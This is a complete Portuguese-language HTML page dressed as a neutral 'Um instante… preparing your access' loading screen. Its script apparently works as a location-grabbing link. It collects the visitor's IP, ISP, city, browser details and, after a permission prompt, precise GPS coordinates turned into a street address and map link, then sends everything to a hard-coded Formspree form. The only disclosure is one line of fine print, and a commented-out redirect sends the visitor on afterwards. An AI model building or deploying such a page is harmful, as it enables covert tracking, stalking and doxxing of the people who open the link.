<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Um instante…</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0; min-height: 100vh; display: grid; place-items: center;
      font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
      background: #0f1115; color: #e7e9ee; padding: 24px;
    }
    .card {
      width: 100%; max-width: 420px; background: #171a21;
      border: 1px solid #262b36; border-radius: 16px; padding: 28px;
      text-align: center;
    }
    h1 { font-size: 1.25rem; margin: 0 0 8px; }
    p { color: #9aa3b2; font-size: .92rem; line-height: 1.5; }
    button {
      width: 100%; padding: 14px; margin-top: 16px; border: 0; border-radius: 10px;
      background: #3d7bff; color: #fff; font-size: 1rem; font-weight: 600; cursor: pointer;
    }
    button:disabled { opacity: .5; cursor: default; }
    .skip { background: transparent; color: #9aa3b2; font-weight: 500; margin-top: 6px; }
    .small { font-size: .75rem; color: #6b7484; margin-top: 18px; }
    .ok { color: #4ade80; }
    .err { color: #f87171; }
  </style>
</head>
<body>
  <div class="card">
    <h1 id="title">Um instante…</h1>
    <p id="status">Estamos preparando seu acesso.</p>
    <button id="btn">Continuar</button>
    <button id="skip" class="skip">Pular e continuar</button>
    <p class="small">Ao continuar, coletamos seu IP e sua localização.</p>
  </div>

<script>
  // 1) ENDPOINT DO SEU FORMULÁRIO
  const FORMSPREE_ENDPOINT = "https://formspree.io/f/mqppjbob";

  const $ = (id) => document.getElementById(id);
  let enviado = false;

  // 2) IP e dados de rede (API pública, sem chave)
  async function coletarIP() {
    try {
      const r = await fetch("https://ipwho.is/");
      const d = await r.json();
      if (!d.success) return {};
      return {
        ip: d.ip,
        tipo_de_conexao: d.type,
        continente: d.continent,
        pais: d.country,
        codigo_pais: d.country_code,
        regiao: d.region,
        cidade_pelo_ip: d.city,
        cep_pelo_ip: d.postal,
        latitude_ip: d.latitude,
        longitude_ip: d.longitude,
        fuso: d.timezone && d.timezone.id,
        provedor: d.connection && d.connection.isp,
        asn: d.connection && d.connection.asn,
      };
    } catch (e) {
      return { ip: "indisponivel" };
    }
  }

  // 3) Localização exata (o navegador mostra o pedido de permissão)
  function pegarPosicao() {
    return new Promise((resolve) => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos),
        () => resolve(null),
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
      );
    });
  }

  // 4) Transforma coordenadas em endereço legível
  async function endereco(lat, lon) {
    try {
      const url = "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=18&addressdetails=1&lat="
        + lat + "&lon=" + lon;
      const r = await fetch(url, { headers: { "Accept-Language": "pt-BR" } });
      const d = await r.json();
      const a = d.address || {};
      const partes = [a.road, a.house_number, a.suburb,
        a.city || a.town || a.village, a.state, a.postcode, a.country]
        .filter(Boolean);
      return partes.join(", ") || d.display_name || "";
    } catch (e) { return ""; }
  }

  // 5) Monta o pacote e envia
  async function enviar(comLocalizacao) {
    if (enviado) return;
    enviado = true;
    $("btn").disabled = true;
    $("skip").disabled = true;
    $("title").textContent = "Coletando…";

    const dados = {
      _subject: "Novo acesso no link",
      pagina: location.href,
      referencia: document.referrer || "direto",
      idioma: navigator.language,
      tela: screen.width + "x" + screen.height,
      plataforma: navigator.platform,
      user_agent: navigator.userAgent,
      data_hora_utc: new Date().toISOString(),
    };

    Object.assign(dados, await coletarIP());

    if (comLocalizacao) {
      $("status").textContent = "Aguardando permissão de localização…";
      const pos = await pegarPosicao();
      if (pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        dados.latitude_exata = latitude;
        dados.longitude_exata = longitude;
        dados.precisao_metros = Math.round(accuracy);
        dados.mapa = "https://www.google.com/maps?q=" + latitude + "," + longitude;
        dados.endereco_aproximado = await endereco(latitude, longitude);
      } else {
        dados.localizacao = "negada ou indisponivel";
      }
    } else {
      dados.localizacao = "pulada";
    }

    $("status").textContent = "Enviando…";
    try {
      const r = await fetch(FORMSPREE_ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify(dados),
      });
      if (!r.ok) throw new Error(r.status);

      $("title").textContent = "Pronto!";
      $("status").textContent = "Registro enviado. Você já pode seguir.";
      $("status").className = "ok";
      $("btn").style.display = "none";
      $("skip").style.display = "none";

      // Para mandar o visitante a outro lugar depois do envio:
      // setTimeout(() => location.href = "https://seusite.com", 1200);
    } catch (e) {
      $("title").textContent = "Quase lá";
      $("status").textContent = "Não deu para enviar. Toque para tentar de novo.";
      $("status").className = "err";
      enviado = false;
      $("btn").disabled = false;
      $("skip").disabled = false;
      $("btn").textContent = "Tentar de novo";
    }
  }

  $("btn").addEventListener("click", () => enviar(true));
  $("skip").addEventListener("click", () => enviar(false));
</script>
</body>
</html>
